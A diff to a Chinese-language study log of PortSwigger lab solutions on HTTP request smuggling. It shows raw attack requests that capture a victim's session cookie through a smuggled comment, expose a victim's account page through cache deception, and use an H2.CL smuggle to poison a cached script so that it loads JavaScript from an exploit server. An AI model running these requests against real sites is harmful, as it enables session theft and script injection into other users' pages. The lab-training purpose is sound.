@@ -1372,6 +1372,153 @@ Content-Length: 0
 
 成功解題～不過這題我有參考答案，不然一直卡在用錯誤的留言功能來當作 30x redirect 的 smuggle request
 
+## What is the difference between web cache poisoning and web cache deception?
+
+- In web cache poisoning, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
+- In web cache deception, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.
+
+## Lab: Exploiting HTTP request smuggling to perform web cache deception
+
+| Dimension | Description                                                                                                                   |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-deception |
+| Lab       | https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception                             |
+
+我發現這題好像有設計缺陷，用 [Lab: Exploiting HTTP request smuggling to capture other users' requests](#lab-exploiting-http-request-smuggling-to-capture-other-users-requests) 的技巧即可提取 victim 的 session，根本不需要用到 web cache deception 的技巧XD
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a690093041173bd829f7ee600d0003e.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 310
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: 0a690093041173bd829f7ee600d0003e.web-security-academy.net
+Cookie: session=EO3DI8ZLAGPx3LP90tOV4DhL4jYytANd
+Content-Length: 950
+
+csrf=QBVcCAvHw91IjrBUfXxUkhTeU6seFJ0A&postId=2&&name=victim1&email=victim1%40123&comment=
+```
+
+normal request => 瀏覽器直接訪問 `/post?postId=2`
+
+一樣是第三輪 attack request 之後，victim 就會發起 HTTP Request，之後就可以從留言提取 victim 的 Cookie，成功通關～
+
+但這題是要考 Web Cache Deception，所以我打算重新做一次
+
+attack request
+
+```
+POST / HTTP/1.1
+Host: 0a7e002003dd8abf80c32674001e00b5.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 43
+
+0
+
+GET /my-account HTTP/1.1
+Start-Line:
+```
+
+讓 victim 的 Cookie 都添加到 smuggled request headers 後面，之後瀏覽器 F12 > Console
+
+```ts
+fetch(
+  "https://0a7e002003dd8abf80c32674001e00b5.web-security-academy.net/resources/js/tracking.js",
+)
+  .then((res) => res.text())
+  .then(console.log);
+```
+
+我嘗試一次就提取到 victim 的 `/my-account` 頁面～
+
+## 中場休息
+
+以上皆為 HTTP/1.1 的 Request Smuggling 的漏洞，接下來要進到 HTTP/2～
+
+## HTTP/2 工具包
+
+Burp Suite 讓我們可以用 HTTP/1.1 的 Syntax 去撰寫 HTTP/2 的 Request，但有些攻擊向量是 HTTP/2 獨有的
+
+- [HTTP/2-exclusive attacks](https://portswigger.net/burp/documentation/desktop/http2/performing-http2-exclusive-attacks)
+
+## Lab: H2.CL request smuggling
+
+| Dimension | Description                                                                                                   |
+| --------- | ------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling/advanced#h2-cl-vulnerabilities                         |
+| Lab       | https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling |
+
+這題的手法跟 [Lab: Exploiting HTTP request smuggling to perform web cache poisoning](#lab-exploiting-http-request-smuggling-to-perform-web-cache-poisoning) 類似，我認為有到 EXPERT 等級的難度，但這題竟然只有 PRACTITIONER，可能是因為前面已經講過這個概念了吧...但我即便第二次作答，還是卡關，有回頭看 [Lab: Exploiting HTTP request smuggling to perform web cache poisoning](#lab-exploiting-http-request-smuggling-to-perform-web-cache-poisoning) 的解法，還有部分參考 PortSwigger 的官方 Solution 才解出來的QQ
+
+P.S. 參考 PortSwigger 官方 Solution 的部分是 `GET /resources` 會 302 + `Location: https://0a5a0076049f20009d8b34e7006800e6.web-security-academy.net/resources/`
+
+exploit-server 構造
+
+```
+/resources
+
+HTTP/1.1 200 OK
+Content-Type: application/javascript; charset=utf-8
+
+alert(document.cookie)
+```
+
+attack request
+
+```
+POST / HTTP/2
+Host: 0a5a0076049f20009d8b34e7006800e6.web-security-academy.net
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: exploit-0a1e006204e120469dd0338e01fd007e.exploit-server.net
+Content-Length: 100
+
+
+```
+
+followed by web cache poison request
+
+```
+GET /resources/js/analyticsFetcher.js HTTP/2
+Host: 0a5a0076049f20009d8b34e7006800e6.web-security-academy.net
+
+
+```
+
+Backend Server 收到的
+
+```
+GET /resources HTTP/1.1
+Host: exploit-0a1e006204e120469dd0338e01fd007e.exploit-server.net
+Content-Length: 100
+
+GET /resources/js/analyticsFetcher.js HTTP/2
+Host: 0a5a0076049f20009d8b34e7006800e6.web-security-academy.net
+...
+```
+
+Backend Server 回傳的
+
+```
+HTTP/2 302 Found
+Location: https://exploit-0a1e006204e120469dd0338e01fd007e.exploit-server.net/resources/
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+```
+
+- Frontend Server 認為 `GET /resources/js/analyticsFetcher.js` 的內容變了，所以會把新的 HTTP Response 快取
+- 正常使用者訪問首頁，載入 `/resources/js/analyticsFetcher.js`
+- 實際上載入 https://exploit-0a1e006204e120469dd0338e01fd007e.exploit-server.net/resources/
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
